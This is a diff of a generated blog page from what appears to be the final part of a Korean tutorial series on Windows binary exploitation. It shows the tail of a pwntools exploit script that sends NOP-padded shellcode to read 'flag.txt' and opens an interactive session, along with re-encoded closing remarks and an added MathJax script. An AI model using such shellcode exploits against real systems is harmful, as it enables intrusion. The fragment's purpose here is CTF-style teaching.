 <span class="hljs-string">	jmp loop</span>
 <span class="hljs-string">readflag:</span>
 <span class="hljs-string">	call flag</span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">&apos;&apos;&apos;</span>
 
 shellcode = (asm(shellcode) + <span class="hljs-string">&quot;flag.txt\x00&quot;</span>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;\x90&quot;</span>)
 p.send(shellcode)
 p.interactive()</code></pre>
 
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%207.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled%207.png"></p>
-<p>험난했다… </p>
-<h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><p>드디어 폰쿨섹시 시리즈 마지막 글까지 모두 끝났습니다 짞짝ㅉㅏㄱ !  </p>
+<p>&#xD5D8;&#xB09C;&#xD588;&#xB2E4;&#x2026; </p>
+<h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xB4DC;&#xB514;&#xC5B4; &#xD3F0;&#xCFE8;&#xC139;&#xC2DC; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xAE4C;&#xC9C0; &#xBAA8;&#xB450; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4; &#xC9DE;&#xC9DD;&#x3149;&#x314F;&#x3131; !  </p>
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%201.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled%201.png"></p>
-<p>오랜만에 Part 1 글을 보면서 시리즈 목표를 다시 봤는데.. 원래 계획에 딱 맞게 Part 5로 마무리됐네요. 사실 거의 무계획이나 다름없었는데 다행이다 휴ㅎ; </p>
+<p>&#xC624;&#xB79C;&#xB9CC;&#xC5D0; Part 1 &#xAE00;&#xC744; &#xBCF4;&#xBA74;&#xC11C; &#xC2DC;&#xB9AC;&#xC988; &#xBAA9;&#xD45C;&#xB97C; &#xB2E4;&#xC2DC; &#xBD24;&#xB294;&#xB370;.. &#xC6D0;&#xB798; &#xACC4;&#xD68D;&#xC5D0; &#xB531; &#xB9DE;&#xAC8C; Part 5&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xB410;&#xB124;&#xC694;. &#xC0AC;&#xC2E4; &#xAC70;&#xC758; &#xBB34;&#xACC4;&#xD68D;&#xC774;&#xB098; &#xB2E4;&#xB984;&#xC5C6;&#xC5C8;&#xB294;&#xB370; &#xB2E4;&#xD589;&#xC774;&#xB2E4; &#xD734;&#x314E;; </p>
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%202.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled%202.png"></p>
-<p>약 3개월간 진행한 정든 시리즈를 떠나보내며.. 이 글이 윈도우를 처음 시작하시는 분들께 많은 도움이 되었으면 좋겠습니다. 이제 다음은 뭘 할지 고민해야 하는데 아 뭐하지 ㅁㄴㅇㄹ </p>
-<p>그럼 한동안은 그동안 봐 두었던 번역글과 하루한줄로 돌아오겠습니다! </p>
+<p>&#xC57D; 3&#xAC1C;&#xC6D4;&#xAC04; &#xC9C4;&#xD589;&#xD55C; &#xC815;&#xB4E0; &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xB5A0;&#xB098;&#xBCF4;&#xB0B4;&#xBA70;.. &#xC774; &#xAE00;&#xC774; &#xC708;&#xB3C4;&#xC6B0;&#xB97C; &#xCC98;&#xC74C; &#xC2DC;&#xC791;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xAED8; &#xB9CE;&#xC740; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xB2E4;&#xC74C;&#xC740; &#xBB58; &#xD560;&#xC9C0; &#xACE0;&#xBBFC;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC544; &#xBB50;&#xD558;&#xC9C0; &#x3141;&#x3134;&#x3147;&#x3139; </p>
+<p>&#xADF8;&#xB7FC; &#xD55C;&#xB3D9;&#xC548;&#xC740; &#xADF8;&#xB3D9;&#xC548; &#xBD10; &#xB450;&#xC5C8;&#xB358; &#xBC88;&#xC5ED;&#xAE00;&#xACFC; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
 <ul>
-<li>모든 시리즈 글의 오류 및 오타 지적은 언제나 환영입니다</li>
+<li>&#xBAA8;&#xB4E0; &#xC2DC;&#xB9AC;&#xC988; &#xAE00;&#xC758; &#xC624;&#xB958; &#xBC0F; &#xC624;&#xD0C0; &#xC9C0;&#xC801;&#xC740; &#xC5B8;&#xC81C;&#xB098; &#xD658;&#xC601;&#xC785;&#xB2C8;&#xB2E4;</li>
 </ul>
 <p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%203.png" srcset="/img/loading.gif" alt="pwncoolsexy-part5/Untitled%203.png"></p>
 <blockquote>
-<p>진짜 끝!</p>
+<p>&#xC9C4;&#xC9DC; &#xB05D;!</p>
 </blockquote>
 
             </div>
@@ -884,6 +881,45 @@ p.interactive()</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
